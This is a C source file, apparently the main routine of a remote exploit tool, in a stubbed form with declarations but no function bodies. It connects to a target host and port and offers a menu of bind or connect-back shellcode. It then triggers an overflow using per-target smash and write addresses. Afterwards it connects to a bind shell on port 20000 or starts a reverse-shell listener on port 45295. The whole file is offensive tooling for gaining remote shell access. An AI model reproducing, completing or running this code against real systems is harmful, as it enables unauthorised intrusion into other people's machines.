
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {size_t target; int * lip; int tip; int tport; } ;
typedef TYPE_1__ args ;
struct TYPE_5__ {int writeaddr; int smashaddr; } ;


 int close (int) ;
 int connect_to_bindshell (int ,int) ;
 int connect_to_remote_host (int ,int ) ;
 int exit (int) ;
 int exploit (int,int ,int ,int *) ;
 int header () ;
 int parse_arguments (int,char**,TYPE_1__*) ;
 int printf (char*) ;
 int scanf (char*,int*) ;
 int start_reverse_handler (int) ;
 int system (char*) ;
 TYPE_2__* target ;

int
main ( int argc, char* argv[] )
{
 int s, option;
 args myargs;

 system ( "clear" );
 header ();
 parse_arguments ( argc, argv, &myargs );
 s = connect_to_remote_host ( myargs.tip, myargs.tport );

 printf ( "--[ select shellcode\n" );
 printf ( "     |\n" );
 printf ( "     |- [0] bind\n" );
 printf ( "     `- [1] cb\n" );
 printf ( ">> " );
 scanf ( "%d", &option );
 switch ( option )
  {
   case 0:
    printf ( "--[ using bind shellcode\n" );
    if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, ((void*)0) ) == 1 )
    {
     printf ( "exploitation failed!\n" );
     exit ( 1 );
    }
    connect_to_bindshell ( myargs.tip, 20000 );
    break;
   case 1:
    printf ( "--[ using cb shellcode\n" );
    if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, myargs.lip ) == 1 )
    {
     printf ( "exploitation failed!\n" );
     exit ( 1 );
    }
    start_reverse_handler ( 45295 );
    break;
   default:
    printf ( "--[ invalid shellcode!\n" ); exit ( 1 );
     }
 close ( s );
 return 0;
}
